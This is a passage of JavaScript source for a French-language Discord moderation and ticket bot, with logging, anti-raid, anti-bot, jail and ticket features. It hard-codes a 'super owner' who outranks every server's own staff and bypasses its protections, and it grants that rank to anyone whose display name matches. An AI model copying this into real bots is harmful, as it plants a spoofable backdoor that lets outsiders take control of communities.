// Build Revision: K2L-Bot-Ultra-Fortress-v34.0
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, AuditLogEvent } = require('discord.js');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('K2L Bot Ultra Fortress Operational v34.0!\n');
}).listen(PORT, '0.0.0.0', () => console.log(`Serveur HTTP actif sur le port ${PORT} (0.0.0.0)`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildPresences,
    ]
});

const PREFIX = '=';
const NO_PERM_MSG = "vous n'avez pas l'autorisation d'exécuter cette commande";

const DATA_DIR = path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'bot-data.json');

const snipeCache = new Map();
const spamTracker = new Map();
const raidJoinTracker = new Map();
const serverConfig = new Map();
const guildStaffConfig = new Map();
const warningsMap = new Map();
const jailDataMap = new Map();
const activeNukes = new Map();

// Super Owner unique et absolu
const SUPER_OWNER_ID = "1166445202148442112";
const SUPER_OWNERS = new Set(["1166445202148442112", "graveuhq"]);
const botOwners = new Set(["1166445202148442112"]);

function saveBotData() {
    try {
        if (!fs.existsSync(DATA_DIR)) {
            fs.mkdirSync(DATA_DIR, { recursive: true });
        }
        const serialized = {
            botOwners: Array.from(botOwners),
            serverConfig: Array.from(serverConfig.entries()),
            guildStaffConfig: Array.from(guildStaffConfig.entries()).map(([gId, cfg]) => [
                gId,
                {
                    admins: Array.from(cfg.admins || []),
                    mods: Array.from(cfg.mods || [])
                }
            ]),
            warningsMap: Array.from(warningsMap.entries()),
            jailDataMap: Array.from(jailDataMap.entries())
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(serialized, null, 2), 'utf8');
    } catch (e) {
        console.error('Erreur sauvegarde bot-data.json:', e.message);
    }
}

function loadBotData() {
    try {
        if (!fs.existsSync(DATA_FILE)) return;
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        const parsed = JSON.parse(raw);

        if (Array.isArray(parsed.botOwners)) {
            botOwners.clear();
            botOwners.add(SUPER_OWNER_ID);
            for (const id of parsed.botOwners) {
                if (id) botOwners.add(id);
            }
        }

        if (Array.isArray(parsed.serverConfig)) {
            serverConfig.clear();
            for (const [gId, cfg] of parsed.serverConfig) {
                serverConfig.set(gId, cfg);
            }
        }

        if (Array.isArray(parsed.guildStaffConfig)) {
            guildStaffConfig.clear();
            for (const [gId, cfg] of parsed.guildStaffConfig) {
                guildStaffConfig.set(gId, {
                    admins: new Set(cfg.admins || []),
                    mods: new Set(cfg.mods || [])
                });
            }
        }

        if (Array.isArray(parsed.warningsMap)) {
            warningsMap.clear();
            for (const [uId, w] of parsed.warningsMap) warningsMap.set(uId, w);
        }

        if (Array.isArray(parsed.jailDataMap)) {
            jailDataMap.clear();
            for (const [uId, j] of parsed.jailDataMap) jailDataMap.set(uId, j);
        }
    } catch (e) {
        console.error('Erreur chargement bot-data.json:', e.message);
    }
}

loadBotData();
function isSuperOwnerById(userId, username = "", globalName = "") {
    if (SUPER_OWNERS.has(userId)) return true;
    if (username && SUPER_OWNERS.has(username.toLowerCase())) return true;
    if (globalName && SUPER_OWNERS.has(globalName.toLowerCase())) return true;
    return false;
}

function isSuperOwner(message) {
    if (!message || !message.author) return false;
    const userId = message.author.id;
    const username = message.author.username ? message.author.username.toLowerCase() : "";
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    return isSuperOwnerById(userId, username, globalName);
}

function getStaffRoles(guildId) {
    if (!guildStaffConfig.has(guildId)) {
        guildStaffConfig.set(guildId, {
            admins: new Set(),
            mods: new Set()
        });
    }
    return guildStaffConfig.get(guildId);
}

function getUserRankLevel(message, userId = null) {
    const targetId = userId || (message && message.author ? message.author.id : null);
    if (!targetId) return 0;
    if (targetId === SUPER_OWNER_ID) return 4;
    if (message && message.author && message.author.id === targetId && isSuperOwner(message)) return 4;
    if (botOwners.has(targetId)) return 3;
    if (message && message.guild) {
        const staff = getStaffRoles(message.guild.id);
        if (staff.admins.has(targetId)) return 2;
        if (staff.mods.has(targetId)) return 1;
    }
    return 0;
}

function isOwner(message) {
    return getUserRankLevel(message) >= 3;
}

function isAdmin(message) {
    return getUserRankLevel(message) >= 2;
}

function isMod(message) {
    return getUserRankLevel(message) >= 1;
}

function getGuildConfig(guildId) {
    if (!serverConfig.has(guildId)) {
        serverConfig.set(guildId, {
            antilink: false,
            antilinkAction: 'delete',
            antispam: false,
            antispamAction: 'mute',
            antispamLimit: 5,
            antispamIntervalMs: 5000,
            antibot: false,
            antibotAction: 'kick',
            antiraid: false,
            antiraidLimit: 6,
            antiraidWindowMs: 8000,
            antiurl: false,
            lockdown: false,
            autoroleIds: [],
            rolePanel: {
                channelId: null,
                messageId: null,
                title: "🎭 Rôles du serveur",
                description: "Clique sur le bouton ci-dessous pour obtenir ou retirer ton rôle.",
                buttonLabel: "Obtenir le rôle",
                buttonEmoji: "🎭",
                roleId: null
            },
            logChannel: null,
            welcomeChannel: null,
            welcomeText: null,
            autopingChannels: [],
            ticketConfig: {
                panelChannel: null,
                categoryDestination: null,
                logChannel: null,
                title: "🎟️ Tickets",
                description: "Bienvenue dans votre espace dédié au support !\nSélectionnez ci-dessous la catégorie correspondant à votre demande.",
                imageUrl: null,
                published: false,
                categories: [
                    { id: 'ticket_bugs', name: 'Bugs', emoji: '🤖', categoryId: null, roleId: null, description: 'Signaler un bug technique' },
                    { id: 'ticket_signalements', name: 'Signalements', emoji: '⚖️', categoryId: null, roleId: null, description: 'Signaler un membre' },
                    { id: 'ticket_infos', name: 'Informations', emoji: '📢', categoryId: null, roleId: null, description: 'Questions générales' },
                    { id: 'ticket_recrutement', name: 'Recrutement', emoji: '🛠️', categoryId: null, roleId: null, description: 'Postuler dans le staff' }
                ]
            }
        });
        saveBotData();
    }
    const cfg = serverConfig.get(guildId);
    if (!Array.isArray(cfg.autopingChannels)) cfg.autopingChannels = [];
    if (!Array.isArray(cfg.autoroleIds)) cfg.autoroleIds = [];
    if (!cfg.rolePanel) {
        cfg.rolePanel = {
            channelId: null,
            messageId: null,
            title: "🎭 Rôles du serveur",
            description: "Clique sur le bouton ci-dessous pour obtenir ou retirer ton rôle.",
            buttonLabel: "Obtenir le rôle",
            buttonEmoji: "🎭",
            roleId: null
        };
    }
    return cfg;
}
function sendLog(guild, embed) {
    if (!guild) return;
    const config = getGuildConfig(guild.id);
    if (!config.logChannel) return;
    const logChan = guild.channels.cache.get(config.logChannel);
    if (logChan) logChan.send({ embeds: [embed] }).catch(() => {});
}

async function fetchAuditExecutor(guild, auditType, targetId = null) {
    try {
        const logs = await guild.fetchAuditLogs({ limit: 5, type: auditType });
        const now = Date.now();
        const entry = logs.entries.find(e => {
            const recent = (now - e.createdTimestamp) < 10000;
            if (!targetId) return recent;
            return recent && e.target && e.target.id === targetId;
        }) || logs.entries.first();
        return entry ? entry.executor : null;
    } catch (e) {
        return null;
    }
}

async function fetchTargetUser(client, guild, targetArg) {
    if (!targetArg) return null;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        const member = await guild.members.fetch(cleanId).catch(() => null);
        if (member) return member.user;
        const user = await client.users.fetch(cleanId);
        return user;
    } catch (e) {
        return null;
    }
}

async function fetchTargetMember(message, targetArg) {
    if (!targetArg) return null;
    const mention = message.mentions.members.first();
    if (mention) return mention;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        return await message.guild.members.fetch(cleanId);
    } catch (e) {
        return null;
    }
}

async function fetchTargetRole(message, roleArg) {
    if (!roleArg) return null;
    const mentionRole = message.mentions.roles.first();
    if (mentionRole) return mentionRole;
    const cleanId = roleArg.replace(/<@&|>/g, '');
    try {
        return await message.guild.roles.fetch(cleanId);
    } catch (e) {
        return null;
    }
}

function parseDuration(durationStr) {
    if (!durationStr) return null;
    const match = durationStr.match(/^(\d+)([smhd])$/);
    if (!match) return null;
    const value = parseInt(match[1]);
    const unit = match[2];
    let ms = value * 1000;
    if (unit === 'm') ms = value * 60 * 1000;
    else if (unit === 'h') ms = value * 60 * 60 * 1000;
    else if (unit === 'd') ms = value * 24 * 60 * 60 * 1000;
    return ms;
}

function containsSuspiciousLink(content) {
    if (!content) return false;
    const patterns = [
        /https?:\/\/[^\s]+/i,
        /discord\.gg\/[^\s]+/i,
        /discord\.com\/invite\/[^\s]+/i,
        /discordapp\.com\/invite\/[^\s]+/i,
        /discord\.com\/gifts\/[^\s]+/i,
        /discord\.gift\/[^\s]+/i,
        /bit\.ly\/[^\s]+/i,
        /tinyurl\.com\/[^\s]+/i,
        /t\.me\/[^\s]+/i
    ];
    return patterns.some(rx => rx.test(content));
}

async function executeAutoSanction(guild, member, action, reason) {
    if (!member || member.user.bot) return;
    try {
        if (action === 'delete') return;
        if (action === 'warn') {
            let userWarns = warningsMap.get(member.id) || [];
            userWarns.push({ reason, moderator: 'AutoMod' });
            warningsMap.set(member.id, userWarns);
            saveBotData();
        } else if (action === 'mute') {
            await member.timeout(10 * 60 * 1000, reason).catch(() => {});
        } else if (action === 'kick') {
            await member.kick(reason).catch(() => {});
        } else if (action === 'jail') {
            const botRolePos = guild.members.me.roles.highest.position;
            const roleIds = member.roles.cache.filter(r => r.id !== guild.id && !r.managed && r.position < botRolePos).map(r => r.id);
            jailDataMap.set(member.id, roleIds);
            saveBotData();
            if (roleIds.length > 0) await member.roles.remove(roleIds).catch(() => {});

            const jailChannel = await guild.channels.create({
                name: `jail-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
                ]
            });
            await jailChannel.send({ content: `<@${member.id}>`, embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('🔒 PRISON (AutoMod)').setDescription(`Raison : ${reason}`)] });
        } else if (action === 'bl' || action === 'ban') {
            await guild.members.ban(member.id, { reason }).catch(() => {});
        }
    } catch (e) {}
}

client.on('messageDelete', async message => {
    if (!message.guild) return;
    const authorTag = message.author ? message.author.tag : 'Inconnu / Cache expiré';
    const authorId = message.author ? message.author.id : 'Inconnu';
    const isBotMsg = message.author ? message.author.bot : false;

    if (!isBotMsg) {
        snipeCache.set(message.channel.id, {
            content: message.content || "[Média / Embed]",
            author: authorTag,
            avatar: message.author ? message.author.displayAvatarURL() : null,
            time: new Date().toLocaleTimeString()
        });
    }

    const executor = await fetchAuditExecutor(message.guild, AuditLogEvent.MessageDelete, authorId !== 'Inconnu' ? authorId : null);

    const embed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('🗑️ Message supprimé (Alerte Sécurité)')
        .setDescription(
            `**Auteur du message :** ${authorTag} (\`${authorId}\`)\n` +
            `**Supprimé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Auteur ou modérateur (Audit)'}\n` +
            `**Salon :** <#${message.channel.id}> (\`${message.channel.id}\`)\n` +
            `**Contenu supprimé :**\n\`\`\`${message.content || 'Aucun texte / Média ou Embed'}\`\`\``
        )
        .setTimestamp();
    sendLog(message.guild, embed);
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (!oldMessage.author || oldMessage.author.bot || !oldMessage.guild) return;
    if (oldMessage.content === newMessage.content) return;

    const embed = new EmbedBuilder()
        .setColor('#f39c12')
        .setTitle('✏️ Message modifié')
        .setDescription(
            `**Auteur :** ${oldMessage.author.tag} (\`${oldMessage.author.id}\`)\n` +
            `**Salon :** <#${oldMessage.channel.id}>\n` +
            `**Avant :** \`${oldMessage.content || 'N/A'}\`\n` +
            `**Après :** \`${newMessage.content || 'N/A'}\``
        )
        .setTimestamp();
    sendLog(oldMessage.guild, embed);
});

client.on('guildBanAdd', async ban => {
    const executor = await fetchAuditExecutor(ban.guild, AuditLogEvent.MemberBanAdd, ban.user.id);
    const embed = new EmbedBuilder()
        .setColor('#c0392b')
        .setTitle('🔨 Membre banni')
        .setDescription(
            `**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)\n` +
            `**Par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
        )
        .setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('guildBanRemove', async ban => {
    const executor = await fetchAuditExecutor(ban.guild, AuditLogEvent.MemberBanRemove, ban.user.id);
    const embed = new EmbedBuilder()
        .setColor('#2ecc71')
        .setTitle('🔓 Membre débanni')
        .setDescription(
            `**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)\n` +
            `**Par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
        )
        .setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('channelCreate', async channel => {
    if (!channel.guild) return;
    const executor = await fetchAuditExecutor(channel.guild, AuditLogEvent.ChannelCreate, channel.id);
    const embed = new EmbedBuilder()
        .setColor('#3498db')
        .setTitle('📁 Salon créé')
        .setDescription(
            `**Nom :** \`${channel.name}\` (\`${channel.id}\`)\n` +
            `**Créé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
        )
        .setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('channelDelete', async channel => {
    if (!channel.guild) return;
    const executor = await fetchAuditExecutor(channel.guild, AuditLogEvent.ChannelDelete, channel.id);
    const embed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('🗑️ Salon supprimé')
        .setDescription(
            `**Nom :** \`${channel.name}\` (\`${channel.id}\`)\n` +
            `**Supprimé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
        )
        .setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('roleCreate', async role => {
    const executor = await fetchAuditExecutor(role.guild, AuditLogEvent.RoleCreate, role.id);
    const embed = new EmbedBuilder()
        .setColor('#9b59b6')
        .setTitle('🏷️ Rôle créé')
        .setDescription(
            `**Nom :** \`${role.name}\` (\`${role.id}\`)\n` +
            `**Créé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
        )
        .setTimestamp();
    sendLog(role.guild, embed);
});

client.on('roleDelete', async role => {
    const executor = await fetchAuditExecutor(role.guild, AuditLogEvent.RoleDelete, role.id);
    const embed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('🗑️ Rôle supprimé')
        .setDescription(
            `**Nom :** \`${role.name}\` (\`${role.id}\`)\n` +
            `**Supprimé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
        )
        .setTimestamp();
    sendLog(role.guild, embed);
});

client.on('guildUpdate', async (oldGuild, newGuild) => {
    const config = getGuildConfig(newGuild.id);
    if (oldGuild.vanityURLCode !== newGuild.vanityURLCode) {
        const executor = await fetchAuditExecutor(newGuild, AuditLogEvent.GuildUpdate, newGuild.id);
        const embed = new EmbedBuilder()
            .setColor('#ff0044')
            .setTitle('🚨 ALERTE URL / SERVEUR MODIFIÉ')
            .setDescription(
                `**Ancienne URL :** \`${oldGuild.vanityURLCode || 'Aucune'}\`\n` +
                `**Nouvelle URL :** \`${newGuild.vanityURLCode || 'Aucune'}\`\n` +
                `**Auteur :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
            )
            .setTimestamp();
        sendLog(newGuild, embed);
    }
});

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
});
client.on('guildMemberAdd', async member => {
    const config = getGuildConfig(member.guild.id);

    // Anti-Raid détection de joins en rafale
    if (config.antiraid) {
        const now = Date.now();
        let joins = raidJoinTracker.get(member.guild.id) || [];
        joins = joins.filter(ts => now - ts < config.antiraidWindowMs);
        joins.push(now);
        raidJoinTracker.set(member.guild.id, joins);

        if (joins.length >= config.antiraidLimit) {
            if (!isSuperOwnerById(member.id, member.user.username, member.user.globalName)) {
                await member.kick('Anti-Raid activé : arrivée massive détectée').catch(() => {});
                const raidEmbed = new EmbedBuilder()
                    .setColor('#ff0044')
                    .setTitle('🚨 ANTI-RAID DÉCLENCHÉ')
                    .setDescription(`Membre expulsé automatiquement : ${member.user.tag} (\`${member.id}\`)`)
                    .setTimestamp();
                sendLog(member.guild, raidEmbed);
                return;
            }
        }
    }

    // Autorole automatique à l'arrivée
    if (Array.isArray(config.autoroleIds) && config.autoroleIds.length > 0) {
        for (const rId of config.autoroleIds) {
            const role = member.guild.roles.cache.get(rId);
            if (role && role.editable) {
                await member.roles.add(role, 'Autorole automatique').catch(() => {});
            }
        }
    }

    if (member.user.bot && member.id !== client.user.id) {
        if (config.antibot) {
            try {
                const fetchedLogs = await member.guild.fetchAuditLogs({ limit: 1, type: 28 });
                const auditLog = fetchedLogs.entries.first();
                const executor = auditLog ? auditLog.executor : null;

                const isExecutorSuperOwner = executor ? isSuperOwnerById(executor.id, executor.username, executor.globalName) : false;

                if (!isExecutorSuperOwner) {
                    await member.kick('Anti-bot activé.');

                    if (executor && !executor.bot) {
                        const execMember = await member.guild.members.fetch(executor.id).catch(() => null);
                        if (execMember) {
                            await executeAutoSanction(member.guild, execMember, config.antibotAction, 'Anti-Bot: Ajout de bot interdit');
                        }
                    }

                    const embed = new EmbedBuilder()
                        .setColor('#e74c3c')
                        .setTitle('🤖 Bot bloqué (Anti-bot)')
                        .setDescription(`**Bot expulsé :** ${member.user.tag} (\`${member.id}\`)\n**Inviteur :** ${executor ? executor.tag : 'Inconnu'}\n**Sanction :** \`${config.antibotAction}\``)
                        .setTimestamp();
                    sendLog(member.guild, embed);
                }
            } catch (err) {}
        }
    }

    if (Array.isArray(config.autopingChannels) && config.autopingChannels.length > 0) {
        for (const chanId of config.autopingChannels) {
            const chan = member.guild.channels.cache.get(chanId);
            if (chan && chan.isTextBased()) {
                chan.send(`<@${member.id}>`).then(msg => {
                    setTimeout(() => {
                        msg.delete().catch(() => {});
                    }, 1000);
                }).catch(() => {});
            }
        }
    }

    if (config.welcomeChannel && config.welcomeText) {
        const channel = member.guild.channels.cache.get(config.welcomeChannel);
        if (channel) {
            const welcomeMsg = config.welcomeText
                .replace(/\{mention\}/g, `<@${member.id}>`)
                .replace(/\{name\}/g, member.user.username);
            channel.send(welcomeMsg).catch(() => {});
        }
    }
});

function getTicketDashboardEmbed(guild, config) {
    const tConfig = config.ticketConfig;
    const panelChanStr = tConfig.panelChannel ? `<#${tConfig.panelChannel}>` : '❌ Non défini';
    const catDestStr = tConfig.categoryDestination ? `<#${tConfig.categoryDestination}>` : '❌ Défaut global';
    const logChanStr = tConfig.logChannel ? `<#${tConfig.logChannel}>` : '❌ Non défini';
    const imgStatus = tConfig.imageUrl ? '✅ image/gif enregistré' : '❌ Aucun';
    const pubStatus = tConfig.published ? '🟢 publié' : '🔴 non publié';
    const catList = tConfig.categories.map(c => {
        const catTag = c.categoryId ? `Cat: \`${c.categoryId}\`` : '';
        const roleTag = c.roleId ? `Rôle: <@&${c.roleId}>` : '';
        const extras = [catTag, roleTag].filter(Boolean).join(' | ');
        return `${c.emoji} **${c.name}** ${extras ? `(${extras})` : ''}`;
    }).join('\n') || 'Aucune catégorie';

    return new EmbedBuilder()
        .setColor('#2b2d31')
        .setTitle('🎫 Configuration des tickets')
        .setDescription(
            `**Salon du panneau :** ${panelChanStr}\n` +
            `**Catégorie par défaut :** ${catDestStr}\n` +
            `**Salon logs / transcripts :** ${logChanStr}\n\n` +
            `**Titre :** ${tConfig.title}\n` +
            `**Image / GIF :** ${imgStatus}\n` +
            `**Panneau :** ${pubStatus}\n\n` +
            `**Catégories, Salons & Rôles dédiés :**\n${catList}\n\n` +
            `*Commandes : \`=setticketcatid <ID> <Nom>\` • \`=setticketrole <@rôle|ID> <Nom>\`*`
        );
}

function getTicketDashboardRows() {
    return [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('t_dash_salons').setLabel('Salons').setEmoji('⚙️').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_texte').setLabel('Texte du panneau').setEmoji('📝').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_media').setLabel('Image / GIF').setEmoji('🖼️').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_cats').setLabel('Catégories').setEmoji('📁').setStyle(ButtonStyle.Secondary)
        ),
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('t_dash_publish').setLabel('Publier le panneau').setEmoji('🚀').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('t_dash_disable').setLabel('Désactiver').setEmoji('🗑️').setStyle(ButtonStyle.Danger)
        )
    ];
}
client.on('interactionCreate', async interaction => {
    if (!interaction.guild) return;

    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'modal_ticket_text') {
            await interaction.deferReply({ ephemeral: true }).catch(() => {});
            const config = getGuildConfig(interaction.guild.id);
            const newTitle = interaction.fields.getTextInputValue('ticket_title_input');
            const newDesc = interaction.fields.getTextInputValue('ticket_desc_input');
            
            if (newTitle) config.ticketConfig.title = newTitle;
            if (newDesc) config.ticketConfig.description = newDesc;
            saveBotData();

            await interaction.editReply({ content: "✅ Textes du panneau mis à jour avec succès !" });
            try {
                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(interaction.guild, config)], components: getTicketDashboardRows() });
            } catch (e) {}
            return;
        }

        if (interaction.customId === 'modal_ticket_media') {
            await interaction.deferReply({ ephemeral: true }).catch(() => {});
            const config = getGuildConfig(interaction.guild.id);
            const url = interaction.fields.getTextInputValue('ticket_image_input');
            
            config.ticketConfig.imageUrl = (!url || url.toLowerCase() === 'none') ? null : url;
            saveBotData();

            await interaction.editReply({ content: "✅ Image / GIF du panneau mis à jour !" });
            try {
                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(interaction.guild, config)], components: getTicketDashboardRows() });
            } catch (e) {}
            return;
        }
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
        if (!interaction.deferred && !interaction.replied) {
            await interaction.deferReply({ ephemeral: true }).catch(() => {});
        }
        const guild = interaction.guild;
        const member = interaction.member;
        const selectedValue = interaction.values[0];
        const config = getGuildConfig(guild.id);
        const tConfig = config.ticketConfig;

        const catObj = tConfig.categories.find(c => c.id === selectedValue) || { name: 'support', emoji: '🎫', categoryId: null, roleId: null };

        try {
            const overwrites = [
                { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
            ];

            if (catObj.roleId && guild.roles.cache.has(catObj.roleId)) {
                overwrites.push({
                    id: catObj.roleId,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory]
                });
            }

            const channelOptions = {
                name: `${catObj.name.toLowerCase()}-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: overwrites
            };

            if (catObj.categoryId) {
                channelOptions.parent = catObj.categoryId;
            } else if (tConfig.categoryDestination) {
                channelOptions.parent = tConfig.categoryDestination;
            }

            const ticketChannel = await guild.channels.create(channelOptions);

            const embed = new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${catObj.emoji} Ticket [ ${catObj.name.toUpperCase()} ] - ${member.user.username}`)
                .setDescription("Un membre de notre équipe va bientôt te prendre en charge.\nClique sur le bouton ci-dessous pour fermer et archiver le ticket.");

            const closeRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('🔒 Fermer le ticket').setStyle(ButtonStyle.Danger)
            );

            const mentionContent = catObj.roleId ? `<@${member.id}> <@&${catObj.roleId}>` : `<@${member.id}>`;
            await ticketChannel.send({ content: mentionContent, embeds: [embed], components: [closeRow] });

            const logEmbed = new EmbedBuilder()
                .setColor('#3498db')
                .setTitle('🎫 Ticket ouvert')
                .setDescription(`**Membre :** ${member.user.tag} (\`${member.user.id}\`)\n**Salon :** ${ticketChannel}\n**Type :** \`${catObj.name}\`${catObj.roleId ? `\n**Rôle notifié :** <@&${catObj.roleId}>` : ''}`)
                .setTimestamp();
            sendLog(guild, logEmbed);

            return interaction.editReply({ content: `✅ Votre ticket a été ouvert avec succès : ${ticketChannel}` });
        } catch (e) {
            return interaction.editReply({ content: "❌ Erreur lors de la création du salon de ticket." });
        }
    }
    if (interaction.isButton()) {
        const guild = interaction.guild;
        const config = getGuildConfig(guild.id);
        const tConfig = config.ticketConfig;

        if (interaction.customId === 'role_panel_claim') {
            if (!interaction.deferred && !interaction.replied) {
                await interaction.deferReply({ ephemeral: true }).catch(() => {});
            }
            const roleId = config.rolePanel && config.rolePanel.roleId;
            if (!roleId) {
                return interaction.editReply({ content: "❌ Aucun rôle n'est configuré sur ce panneau." });
            }
            const role = guild.roles.cache.get(roleId);
            if (!role) {
                return interaction.editReply({ content: "❌ Le rôle configuré est introuvable." });
            }
            const member = interaction.member;
            try {
                if (member.roles.cache.has(role.id)) {
                    await member.roles.remove(role, 'Retrait via bouton rôle').catch(() => {});
                    return interaction.editReply({ content: `✅ Le rôle **${role.name}** t'a été retiré.` });
                } else {
                    await member.roles.add(role, 'Attribution via bouton rôle').catch(() => {});
                    return interaction.editReply({ content: `✅ Tu as reçu le rôle **${role.name}** !` });
                }
            } catch (e) {
                return interaction.editReply({ content: "❌ Impossible de modifier ce rôle (vérifie la hiérarchie du bot)." });
            }
        }

        if (interaction.customId === 'close_ticket') {
            if (!interaction.deferred && !interaction.replied) {
                await interaction.deferReply({ ephemeral: true }).catch(() => {});
            }
            const channel = interaction.channel;
            try {
                const messages = await channel.messages.fetch({ limit: 100 });
                const transcript = messages.reverse().map(m => `[${new Date(m.createdTimestamp).toLocaleString()}] ${m.author.tag}: ${m.content}`).join('\n');
                
                const buffer = Buffer.from(transcript, 'utf-8');
                const attachment = new AttachmentBuilder(buffer, { name: `transcription-${channel.name}.txt` });

                const logEmbed = new EmbedBuilder()
                    .setColor('#e74c3c')
                    .setTitle('📁 Ticket fermé & Archivé')
                    .setDescription(`**Salon :** \`${channel.name}\`\n**Fermé par :** ${interaction.user.tag}`)
                    .setTimestamp();

                if (tConfig.logChannel) {
                    const logChan = guild.channels.cache.get(tConfig.logChannel);
                    if (logChan) await logChan.send({ embeds: [logEmbed], files: [attachment] });
                } else {
                    sendLog(guild, logEmbed);
                }
            } catch (err) {}

            await interaction.editReply({ content: "🔒 Fermeture du salon en cours..." });
            setTimeout(() => channel.delete().catch(() => {}), 2000);
            return;
        }

        if (interaction.customId === 'join_giveaway') {
            if (!interaction.deferred && !interaction.replied) {
                await interaction.reply({ content: "🎉 Tu participes officiellement au giveaway !", ephemeral: true }).catch(() => {});
            }
            return;
        }

        if (interaction.customId.startsWith('t_dash_')) {
            const actorRank = getUserRankLevel(null, interaction.user.id) || (isSuperOwnerById(interaction.user.id, interaction.user.username, interaction.user.globalName) ? 4 : 0);
            if (actorRank < 3) {
                return interaction.reply({ content: NO_PERM_MSG, ephemeral: true }).catch(() => {});
            }

            const action = interaction.customId.replace('t_dash_', '');

            if (action === 'salons') {
                return interaction.reply({ content: `⚙️ **Salons, Catégories & Rôles :**\n• Salon du panneau : \`=setticketpanel #salon\`\n• Catégorie globale : \`=setticketcat <ID>\`\n• Catégorie spécifique : \`=setticketcatid <ID> <Nom>\`\n• Rôle dédié & ping : \`=setticketrole <@rôle|ID> <Nom>\`\n• Logs : \`=setticketlog #salon\``, ephemeral: true });
            }
            if (action === 'texte') {
                const modal = new ModalBuilder()
                    .setCustomId('modal_ticket_text')
                    .setTitle('Modifier le Texte du Panneau');

                const titleInput = new TextInputBuilder()
                    .setCustomId('ticket_title_input')
                    .setLabel('Titre du panneau')
                    .setStyle(TextInputStyle.Short)
                    .setValue(tConfig.title)
                    .setRequired(true);

                const descInput = new TextInputBuilder()
                    .setCustomId('ticket_desc_input')
                    .setLabel('Description du panneau')
                    .setStyle(TextInputStyle.Paragraph)
                    .setValue(tConfig.description)
                    .setRequired(true);

                modal.addComponents(new ActionRowBuilder().addComponents(titleInput), new ActionRowBuilder().addComponents(descInput));
                return interaction.showModal(modal);
            }
            if (action === 'media') {
                const modal = new ModalBuilder()
                    .setCustomId('modal_ticket_media')
                    .setTitle('Modifier l\'Image / GIF');

                const imageInput = new TextInputBuilder()
                    .setCustomId('ticket_image_input')
                    .setLabel('URL de l\'image (ou "none")')
                    .setStyle(TextInputStyle.Short)
                    .setValue(tConfig.imageUrl || '')
                    .setRequired(false);

                modal.addComponents(new ActionRowBuilder().addComponents(imageInput));
                return interaction.showModal(modal);
            }
            if (action === 'cats') {
                const catInfo = tConfig.categories.map(c => `• **${c.emoji} ${c.name}** -> Cat: \`${c.categoryId || 'Défaut'}\` | Rôle: ${c.roleId ? `<@&${c.roleId}>` : '`Aucun`'}`).join('\n') || 'Aucune';
                return interaction.reply({ content: `📁 **Catégories actuelles :**\n${catInfo}\n\n• Ajouter : \`=ticketadd <Nom> <Emoji>\`\n• Assigner catégorie : \`=setticketcatid <ID> <Nom>\`\n• Assigner rôle : \`=setticketrole <@rôle|ID> <Nom>\``, ephemeral: true });
            }
            if (action === 'disable') {
                if (!interaction.deferred && !interaction.replied) await interaction.deferReply({ ephemeral: true }).catch(() => {});
